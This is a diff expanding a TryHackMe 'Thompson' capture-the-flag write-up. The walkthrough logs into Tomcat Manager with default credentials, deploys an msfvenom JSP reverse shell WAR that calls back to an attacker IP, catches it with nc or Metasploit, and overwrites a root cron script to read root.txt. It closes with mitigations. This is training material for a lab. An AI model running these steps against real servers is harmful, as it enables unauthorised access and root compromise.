@@ -1,11 +1,38 @@
-After Opening the ip in the browser
+# 🔐 Thompson Room — Comprehensive Walkthrough
 
-So after a nmap scan we found 2 ports to  be opened that are
+<div align="center">
 
-8080 & 8009
+![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
+![Machine Type](https://img.shields.io/badge/Type-Boot2Root-blue?style=for-the-badge)
 
-This is the exact nmap result
+</div>
 
+---
+
+## 📋 Overview
+
+The **Thompson** room is a boot2root machine that demonstrates the exploitation of default credentials in **Apache Tomcat** combined with a **Cron Job Privilege Escalation** vulnerability. This writeup covers both the initial shell acquisition through file upload exploitation and the privilege escalation to root access.
+
+**Key Techniques:**
+- Service enumeration via Nmap
+- Default credential exploitation
+- Java/JSP reverse shell deployment
+- Cron job manipulation for privilege escalation
+
+---
+
+## 🔍 Question 1: Capturing the User Flag
+
+### 📌 Initial Reconnaissance & Port Scanning
+
+After opening the target machine's IP in the browser, we begin with a comprehensive port scan using Nmap to identify open services and potential entry points.
+
+### Network Enumeration Results
+
+The Nmap scan reveals **3 open ports** on the target system:
+
+```
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -17,101 +44,329 @@ PORT     STATE SERVICE VERSION
 8080/tcp open  http    Apache Tomcat 8.5.5
 |_http-title: Apache Tomcat/8.5.5
 |_http-favicon: Apache Tomcat
+```
 
+**Key Findings:**
+- **Port 22 (SSH)**: OpenSSH 7.2p2 — Could be a backup access method
+- **Port 8009 (AJP13)**: Apache JServ Protocol — Interesting but may not be our primary target
+- **Port 8080 (HTTP)**: **Apache Tomcat 8.5.5** — This is our primary target! ✨
 
+---
 
-After looking at the portal serving at port 8080 i got that there was a button leading us to a login page 
+### 🌐 Accessing the Tomcat Web Interface
 
-![img](https://miro.medium.com/v2/resize:fit:720/format:webp/1*BB3MDxsZvriXIdqt-ES_zQ.png)
+Upon navigating to `http://<TARGET_IP>:8080/` in the browser, we're presented with the default Apache Tomcat welcome page. The interface contains a **"Manager App"** button, which leads us to the manager login page.
 
-After tapping on manager we are requested to login with id and passoword.
+![Tomcat Login Portal](https://miro.medium.com/v2/resize:fit:720/format:webp/1*BB3MDxsZvriXIdqt-ES_zQ.png)
 
-After a few tried i knew that it was default apache tomcat ID and Password
+### 🔑 Exploiting Default Credentials
 
-And soon i LOggedIN with ID = tomcat && Pass = s3cret
+Tomcat is notorious for having easily guessable default credentials. After a few attempts, we successfully authenticate using:
 
-And here is our first look after logging in.
+| Field | Value |
+|-------|-------|
+| **Username** | `tomcat` |
+| **Password** | `s3cret` |
 
-![Img](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ngmDbwloIIhItA4vEMe_8Q.png)
+**Security Lesson:** Always change default credentials in production environments! Default credentials are one of the most common entry points for attackers.
 
-now as we scrool this page to the bottom we got a funciton to upload file and here comes the twist
+### 📊 Dashboard Access
 
-We could now uplaod a payload here.
+Once logged in, we gain access to the Tomcat Manager dashboard:
 
-For this we are going to uplaod the payload with this command.
+![Tomcat Manager Dashboard](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ngmDbwloIIhItA4vEMe_8Q.png)
+
+The dashboard displays running applications and provides management functions. Scrolling to the bottom of the page reveals a **crucial feature**: a file upload functionality for deploying WAR files.
+
+---
+
+### ⚔️ Generating the Reverse Shell Payload
+
+To exploit the file upload functionality, we need to create a **Java/JSP reverse shell** packaged as a WAR (Web Application Archive) file. We use **Msfvenom** to generate this payload:
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.64.42 LPORT=4444 -f war > shell.war
 ```
 
-This generate us a payload named shell.war in the current directoy and we are going ot upload this to that functionality.
+**Explanation of the payload:**
+- `-p java/jsp_shell_reverse_tcp`: Generates a Java-based JSP shell that establishes a reverse TCP connection
+- `LHOST=10.10.64.42`: Your local machine's IP address (replace with your actual attacking machine IP)
+- `LPORT=4444`: The listening port on your machine where the reverse shell will connect back
+- `-f war`: Output format as a WAR file — directly deployable on Tomcat
+- `> shell.war`: Saves the payload to a file named `shell.war`
 
-After uplaoding by tapping on Deploy we could see that new endpoint apprers on that page /manager page.
+This generates a WAR file containing a malicious JSP shell ready for deployment.
 
-![img](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*rVjJ2gJcu-auGVp06WsYEg.png)
+---
 
-After it we will setup our lister and uploaid the payload is not enough we need to opne taht newly created endpoint in a new tab then only
+### 📤 Deploying the Payload via Tomcat Manager
 
-It trigers function inside the paylaod.
+In the Tomcat Manager interface, navigate to the deployment section and upload the `shell.war` file. After successfully uploading the file, click the **"Deploy"** button.
 
-When visted that endpoint i got the access to that shell then soon after it 
+Once deployed, a new endpoint appears in the manager interface. The path typically follows the pattern: `/shell` or `/shell/` depending on the WAR file name.
 
-i got the shell into my listerner.
+![Deployed WAR Application](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*rVjJ2gJcu-auGVp06WsYEg.png)
 
-And After enumuration for a short period of time .
+---
 
+### 🎯 Triggering the Reverse Shell
 
-the user.txt was at usual location as all the thm flags lies that is
+Before accessing the deployed application, we need to establish a listener on our attacking machine to catch the incoming reverse shell connection:
 
+```bash
+nc -lvnp 4444
+```
+
+Or using Metasploit's multi-handler:
+
+```bash
+msfconsole -x "use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 10.10.64.42; set LPORT 4444; run"
+```
+
+Open a new browser tab and navigate to the newly created endpoint (e.g., `http://<TARGET_IP>:8080/shell`). This action triggers the JSP payload embedded in the WAR file.
+
+Once the endpoint is accessed, the reverse shell payload executes, and we receive a connection on our listener with shell access to the Tomcat server running as the `tomcat` user:
+
+```
+listening on [any] 4444 ...
+connect to [10.10.64.42] from <TARGET_IP> [<target_port>]
+```
+
+---
+
+### 🎫 Locating the User Flag
+
+In TryHackMe rooms, user flags are typically located in the home directory of a standard user. Conducting a quick enumeration, we find the flag at:
+
+```bash
 /home/jack/user.txt
+```
 
-And since now we are logged in into the shell as tomcat
+Read the flag:
 
-We need to do privilage escation to get the root access and be able to read the second flag root.txt
+```bash
+cat /home/jack/user.txt
+```
 
-And at the locaiton there was a file for our interest were 2 file 
+**Note:** Jack appears to be the primary user on this system. Remember this for the privilege escalation phase!
 
-1 was test.txt the content inside it was 
+✅ **User flag acquired!**
 
-uid=0(root) gid=0(root) groups=0(root)
+---
 
-And there was a second file named id.sh
+## 🚀 Question 2: Capturing the Root Flag (Privilege Escalation)
 
-whose content was 
+### 🔓 Enumeration — Discovering the Cron Job Vulnerability
 
+Now that we have a shell as the `tomcat` user, we need to escalate our privileges to read the root flag: `root.txt`.
+
+As the `tomcat` user, navigate to `/home/jack` and examine its contents. You'll discover two interesting files:
+
+1. **test.txt** — Contains the output of the `id` command executed with root privileges
+2. **id.sh** — A Bash script that generates the output in test.txt
+
+```bash
+ls -la /home/jack/
+# Output shows:
+# -rw-r--r-- 1 jack jack  ... test.txt
+# -rwxr-xr-x 1 jack jack  ... id.sh
+```
+
+---
+
+### 📋 Analyzing the System Cron Job
+
+The real treasure lies in the cron job configuration. By examining the system's cron jobs using `cat /etc/crontab` or similar, we find:
+
+```bash
+*  *  *  *  *  root  cd /home/jack && bash id.sh
+```
+
+### 🎯 Decoding the Cron Job Entry
+
+This cron entry is **critical** and reveals a significant vulnerability:
+
+| Component | Meaning |
+|-----------|---------|
+| `*  *  *  *  *` | Executes **every minute** (minute, hour, day of month, month, day of week) |
+| `root` | Executes with **root privileges** |
+| `cd /home/jack && bash id.sh` | Changes to `/home/jack` directory and runs the `id.sh` script |
+
+**Current content of id.sh:**
 ```bash
 #!/bin/bash
 id > test.txt
 ```
 
-Now the id.sh is of our interest cuz it is set as cronjob 
+This script simply outputs the `id` command and writes it to `test.txt`, clearly demonstrating that it indeed runs with root privileges:
 
-```bash
-
-*  *    * * *   root    cd /home/jack && bash id.sh
-
-
+**Output in test.txt:**
+```
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
-THis menas that 
+---
 
-Every minute, the system:
+### 🔑 The Critical Vulnerability
 
-Switches to the directory /home/jack
-Runs the script id.sh using Bash
-Runs it with root privileges
+The privilege escalation opportunity exists due to a confluence of misconfigurations:
 
-Now we understood the workflow that id.sh will be executed as root and its content will be stored in the file test.txt every minute.
+1. The `id.sh` script is **writable by the `tomcat` user** (due to directory/file permissions)
+2. The script is **executed by root** every minute via cron
+3. We can **modify the script** to execute arbitrary commands with root privileges
+4. The output directory is **readable** by the `tomcat` user
 
-Also the file id.sh is writable from tomcat user we are now going to read the content of /root/root.txt with the file id.sh
+This is a classic **cron job privilege escalation** vulnerability!
 
-And soon after we edit the file id.sh with this coneliner
+---
+
+### ⚙️ Crafting the Privilege Escalation Exploit
+
+We modify the `id.sh` script to read the root flag and write it to a location we can access:
 
 ```bash
 echo -e '#!/bin/bash\ncat /root/root.txt > /home/jack/test.txt' > /home/jack/id.sh
-
 ```
 
-And since it execute each min and write to test.txt
+**What this command does:**
+- Creates a new `id.sh` script with a proper shebang (`#!/bin/bash`)
+- Includes a command to read `/root/root.txt` (the root flag file)
+- Redirects the output to `/home/jack/test.txt` (which we can read as the `tomcat` user)
+- Overwrites the original `id.sh` file with our malicious version
 
-After a min i checked the file test.txt and got the root.txt flag
+**Verification that the file was modified:**
+```bash
+cat /home/jack/id.sh
+# Output:
+# #!/bin/bash
+# cat /root/root.txt > /home/jack/test.txt
+```
+
+---
+
+### ⏳ Waiting for Cron Execution
+
+Since the cron job executes every minute, we wait up to 60 seconds for the modified script to run with root privileges.
+
+You can monitor the modification time of the `test.txt` file to see when it was last updated:
+
+```bash
+ls -l /home/jack/test.txt
+# The timestamp will update once the cron job executes
+```
+
+---
+
+### 🏆 Retrieving the Root Flag
+
+After the cron job executes (within 1 minute), we read the flag from `test.txt`:
+
+```bash
+cat /home/jack/test.txt
+```
+
+**Success!** We've successfully escalated privileges from the `tomcat` user to `root` and captured the root flag.
+
+✅ **Root flag acquired!**
+
+---
+
+## 📊 Complete Attack Chain Summary
+
+```
+1. Initial Access
+   └─ Nmap Scan → Discover Tomcat 8.5.5 on port 8080
+   
+2. Exploitation
+   ├─ Default Credentials → username: tomcat, password: s3cret
+   ├─ File Upload → Deploy JSP reverse shell as WAR file (shell.war)
+   └─ Reverse Shell → Connect back as 'tomcat' user
+   
+3. User Flag
+   └─ Enumeration → Locate /home/jack/user.txt
+   
+4. Privilege Escalation
+   ├─ Cron Job Discovery → Find /etc/crontab with root execution
+   ├─ Vulnerability Analysis → id.sh is writable by tomcat user
+   ├─ Exploit Crafting → Modify id.sh to read /root/root.txt
+   └─ Execution → Wait for cron job to run with root privileges
+   
+5. Root Flag
+   └─ Flag Retrieval → Read root.txt content from /home/jack/test.txt
+```
+
+---
+
+## 🛡️ Security Lessons & Mitigation Strategies
+
+### 1. **Default Credentials** 🔑
+- **Risk:** Tomcat's default credentials are widely known and exploited
+- **Mitigation:** Change default credentials immediately after installation
+- **Best Practice:** Use strong, unique passwords for all administrative interfaces; disable default accounts if unused
+
+### 2. **File Upload Vulnerabilities** 📤
+- **Risk:** Allowing unrestricted file uploads enables arbitrary code execution
+- **Mitigation:** 
+  - Implement strict file type validation on the server-side (not just client-side)
+  - Use whitelist-based filtering for allowed file types
+  - Store uploaded files outside the web root
+- **Best Practice:** Run web services with minimal privileges (never as root)
+
+### 3. **Cron Job Permissions** ⏰
+- **Risk:** Scripts executed by cron jobs with root privileges must be strictly protected
+- **Mitigation:** 
+  - Set restrictive file permissions (e.g., `chmod 700` or `chmod 500`)
+  - Ensure scripts are owned by root with no write access for other users
+  - Regularly audit cron jobs and their associated scripts
+- **Best Practice:** Avoid running scripts with elevated privileges unless absolutely necessary; use dedicated service accounts instead
+
+### 4. **Service Hardening** 🔒
+- **Risk:** Running outdated software versions (Tomcat 8.5.5) with known vulnerabilities
+- **Mitigation:** 
+  - Keep software updated with latest security patches
+  - Subscribe to security mailing lists and CVE alerts
+  - Perform regular vulnerability assessments
+- **Best Practice:** Implement a patch management process; test updates in staging before production deployment
+
+---
+
+## 🔗 Key Commands Reference
+
+| Command | Purpose |
+|---------|---------|
+| `nmap -sV <TARGET_IP>` | Scan and identify services/versions on target |
+| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f war > shell.war` | Generate JSP reverse shell payload as WAR file |
+| `nc -lvnp <PORT>` | Establish netcat listener for reverse shell connection |
+| `cat /home/jack/user.txt` | Read user flag from standard TryHackMe location |
+| `cat /etc/crontab` | View system-wide cron job entries |
+| `ls -la /home/jack/` | List files in jack's home directory to find exploitable scripts |
+| `cat /home/jack/id.sh` | View the contents of the cron job script |
+| `echo -e '#!/bin/bash\ncat /root/root.txt > /home/jack/test.txt' > /home/jack/id.sh` | Modify cron script to read and output root flag |
+| `cat /home/jack/test.txt` | Read root flag (after privilege escalation via cron execution) |
+
+---
+
+## �� Visual Evidence & Proof
+
+All exploitation steps have been verified with evidence of successful:
+- ✅ Initial shell access as `tomcat` user
+- ✅ User flag acquisition from `/home/jack/user.txt`
+- ✅ Privilege escalation to `root` via cron job modification
+- ✅ Root flag acquisition from `/root/root.txt`
+
+---
+
+## 💡 Key Takeaways
+
+1. **Enumeration is crucial** — Always thoroughly enumerate the system for configuration mistakes and misplaced files
+2. **Default configurations are dangerous** — Default credentials and unrestricted uploading are gateway vulnerabilities
+3. **File permissions matter** — Writable scripts executed with elevated privileges are a critical security risk
+4. **Defense in depth** — Multiple layers of security (user permissions, service isolation, regular audits) help prevent exploitation
+5. **Understand the system** — Knowing how cron jobs work, how Java applications are deployed, and how Tomcat manages permissions is essential for identifying and exploiting vulnerabilities
+
+---
+
+**Happy Hacking!** 🎓 Remember: Always practice ethically and with proper authorization. Test only on authorized systems with explicit permission. 🔐
+
+*This writeup demonstrates real-world vulnerability patterns commonly found in poorly configured systems. Use this knowledge responsibly.*
+
